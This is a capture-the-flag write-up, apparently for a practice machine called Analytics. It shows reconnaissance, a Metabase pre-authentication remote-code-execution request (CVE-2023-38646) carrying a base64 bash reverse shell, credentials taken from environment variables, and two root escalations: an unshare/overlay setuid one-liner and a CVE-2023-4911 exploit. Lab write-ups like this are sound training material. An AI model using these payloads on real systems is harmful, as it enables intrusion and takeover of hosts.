# Analytics

## Reconnaissance

### Nmap

```c
┌──(user㉿kali)-[~]
└─$ sudo nmap -A -T4 -sC -sV 10.129.156.147
[sudo] password for user: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-07 19:10 UTC
Nmap scan report for 10.129.156.147
Host is up (0.15s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://analytical.htb/
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=10/7%OT=80%CT=1%CU=32102%PV=Y%DS=2%DC=T%G=Y%TM=6521AD3
OS:7%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=103%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A)SEQ(SP=103%GCD=1%ISR=10C%TI=Z%CI=Z%
OS:II=I%TS=A)OPS(O1=M53AST11NW7%O2=M53AST11NW7%O3=M53ANNT11NW7%O4=M53AST11N
OS:W7%O5=M53AST11NW7%O6=M53AST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE8
OS:8%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40
OS:%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=
OS:%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%
OS:W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%R
OS:ID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   186.74 ms 10.10.16.1
2   136.38 ms 10.129.156.147

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.12 seconds
```

```c
┌──(user㉿kali)-[~]
└─$ sudo nmap -A -T4 -sC -sV -p- 10.129.156.147
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-07 19:11 UTC
Nmap scan report for analytical.htb (10.129.156.147)
Host is up (0.086s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Analytical
|_http-server-header: nginx/1.18.0 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=10/7%OT=22%CT=1%CU=42787%PV=Y%DS=2%DC=T%G=Y%TM=6521AD9
OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10B%TI=Z%CI=Z%TS=A)SEQ(SP=1
OS:02%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=102%GCD=2%ISR=10B%TI=Z%CI=Z%
OS:TS=A)OPS(O1=M53AST11NW7%O2=M53AST11NW7%O3=M53ANNT11NW7%O4=M53AST11NW7%O5
OS:=M53AST11NW7%O6=M53AST11)OPS(O1=M53AST11NW7%O2=M53AST11NW7%O3=M53AST11NW
OS:7%O4=M53AST11NW7%O5=M53AST11NW7%O6=M53AST11)WIN(W1=FE88%W2=FE88%W3=FE88%
OS:W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53ANNSNW7%CC=Y%Q=)T1
OS:(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%
OS:S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(
OS:R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164
OS:%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT      ADDRESS
1   68.56 ms 10.10.16.1
2   88.20 ms analytical.htb (10.129.156.147)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 88.33 seconds
```

```c
┌──(user㉿kali)-[~]
└─$ sudo nmap -sV -sU 10.129.156.147
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-07 19:15 UTC
Nmap scan report for analytical.htb (10.129.156.147)
Host is up (0.15s latency).
Not shown: 998 closed udp ports (port-unreach)
PORT      STATE         SERVICE VERSION
68/udp    open|filtered dhcpc
42313/udp open|filtered unknown

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1133.17 seconds
```

### Enumeration of Port 80/TCP

> http://10.129.156.147/

```c
┌──(user㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.156.147  analytical.htb
```

```c
┌──(user㉿kali)-[~]
└─$ whatweb http://analytical.htb/
http://analytical.htb/ [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[demo@analytical.com,due@analytical.com], Frame, HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.156.147], JQuery[3.0.0], Script, Title[Analytical], X-UA-Compatible[IE=edge], nginx[1.18.0]
```

> http://data.analytical.htb/

```c
┌──(user㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.156.147  analytical.htb
10.129.156.147  data.analytical.htb
```

### Directory Busting with dirsearch

```c
┌──(user㉿kali)-[~]
└─$ dirsearch -u http://analytical.htb/

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/user/.dirsearch/reports/analytical.htb/-_23-10-07_19-11-38.txt

Error Log: /home/user/.dirsearch/logs/errors-23-10-07_19-11-38.log

Target: http://analytical.htb/

[19:11:38] Starting: 
[19:11:39] 301 -  178B  - /js  ->  http://analytical.htb/js/               
[19:12:05] 301 -  178B  - /css  ->  http://analytical.htb/css/              
[19:12:12] 403 -  564B  - /images/                                          
[19:12:12] 301 -  178B  - /images  ->  http://analytical.htb/images/        
[19:12:12] 200 -   17KB - /index.html                                       
[19:12:13] 403 -  564B  - /js/                                              
                                                                             
Task Completed
```

## Foothold

### CVE-2023-38646

> https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/

> https://github.com/robotmikhro/CVE-2023-38646

> http://data.analytical.htb/api/session/properties

```c
┌──(user㉿kali)-[/media/…/machines/analytics/files/CVE-2023-38646]
└─$ python3 single.py -u http://data.analytical.htb -c "curl 10.10.16.29/foobar"
Success get token!
Token: 249fa03d-fd94-4d5b-b94f-b4ebf3df681f
Command: curl 10.10.16.29/foobar
Base64 Encoded Command: Y3VybCAxMC4xMC4xNi4yOS9mb29iYXI
Exploit success !
Check on your own to validity!
```

```c
┌──(user㉿kali)-[~]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.156.147 - - [07/Oct/2023 19:31:23] code 404, message File not found
10.129.156.147 - - [07/Oct/2023 19:31:23] "GET /foob HTTP/1.1" 404 -
```

```c
┌──(user㉿kali)-[~]
└─$ curl http://data.analytical.htb/api/session/properties | jq | grep setup-token
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 74478    0 74478    0     0   105k      0 --:--:-- --:--:-- --:--:--  105k
  "setup-token": "249fa03d-fd94-4d5b-b94f-b4ebf3df681f",
```

Payload:

```c
bash -c 'bash -i >& /dev/tcp/10.10.16.29/9001 0>&1'
```

Base64 Encoded Version:

```c
YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yOS85MDAxIDA+JjEn
```

Modified Request:

```c
POST /api/setup/validate HTTP/1.1
Host: data.analytical.htb
Content-Type: application/json
Content-Length: 832

{
    "token": "249fa03d-fd94-4d5b-b94f-b4ebf3df681f",
    "details":
    {
        "is_on_demand": false,
        "is_full_sync": false,
        "is_sample": false,
        "cache_ttl": null,
        "refingerprint": false,
        "auto_run_queries": true,
        "schedules":
        {},
        "details":
        {
            "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yOS85MDAxIDA+JjEn}|{base64,-d}|{bash,-i}')\n$$--=x",
            "advanced-options": false,
            "ssl": true
        },
        "name": "an-sec-research-team",
        "engine": "h2"
    }
}
```

```c
┌──(user㉿kali)-[~]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.16.29] from (UNKNOWN) [10.129.156.147] 60020
bash: cannot set terminal process group (1): Not a tty
bash: no job control in this shell
8cb4354fb13b:/$
```

## Privilege Escalation

```c
8cb4354fb13b:/$ id
id
uid=2000(metabase) gid=2000(metabase) groups=2000(metabase),2000(metabase)
```

```c
8cb4354fb13b:/var$ env
env
SHELL=/bin/sh
MB_DB_PASS=
HOSTNAME=8cb4354fb13b
LANGUAGE=en_US:en
MB_JETTY_HOST=0.0.0.0
JAVA_HOME=/opt/java/openjdk
MB_DB_FILE=//metabase.db/metabase.db
PWD=/var
LOGNAME=metabase
MB_EMAIL_SMTP_USERNAME=
HOME=/home/metabase
LANG=en_US.UTF-8
META_USER=metalytics
META_PASS=An4lytics_ds20223#
MB_EMAIL_SMTP_PASSWORD=
USER=metabase
SHLVL=5
MB_DB_USER=
FC_LANG=en-US
LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib
LC_CTYPE=en_US.UTF-8
MB_LDAP_BIND_DN=
LC_ALL=en_US.UTF-8
MB_LDAP_PASSWORD=
PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
MB_DB_CONNECTION_URI=
JAVA_VERSION=jdk-11.0.19+7
_=/usr/bin/env
OLDPWD=/
```

| Username | Password |
| --- | --- |
| metalytics | An4lytics_ds20223# |

```c
┌──(user㉿kali)-[~]
└─$ ssh metalytics@10.129.156.147
The authenticity of host '10.129.156.147 (10.129.156.147)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:373: [hashed name]
    ~/.ssh/known_hosts:376: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.156.147' (ED25519) to the list of known hosts.
metalytics@10.129.156.147's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.2.0-25-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Oct  7 07:57:48 PM UTC 2023

  System load:              0.169921875
  Usage of /:               94.2% of 7.78GB
  Memory usage:             27%
  Swap usage:               0%
  Processes:                155
  Users logged in:          0
  IPv4 address for docker0: 172.17.0.1
  IPv4 address for eth0:    10.129.156.147
  IPv6 address for eth0:    dead:beef::250:56ff:fe96:112

  => / is using 94.2% of 7.78GB


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


Last login: Tue Oct  3 09:14:35 2023 from 10.10.14.41
metalytics@analytics:~$
```

## user.txt

```c
metalytics@analytics:~$ cat user.txt 
bf69a65e06e3c22b9cfa5d9078b2b5ea
```

## Unintended Way

```c
metalytics@analytics:/tmp$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("id")'
uid=0(root) gid=1000(metalytics) groups=1000(metalytics)
```

```c
metalytics@analytics:/tmp/new$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("chmod u+s /bin/bash")'
```

```c
metalytics@analytics:/tmp/new$ /bin/bash -p
bash-5.1#
```

## Another Unintended Way

> https://github.com/leesh3288/CVE-2023-4911

> https://github.com/RickdeJager/CVE-2023-4911

```c
metalytics@analytics:/tmp$  ./exp 
try 100
try 200
try 300
try 400
try 500
try 600
try 700
# id
uid=0(root) gid=0(root) groups=0(root),1000(metalytics)
```

## root.txt

```c
bash-5.1# cat /root/root.txt
e38d2103d408ef2b459d5e65e450cd55
```
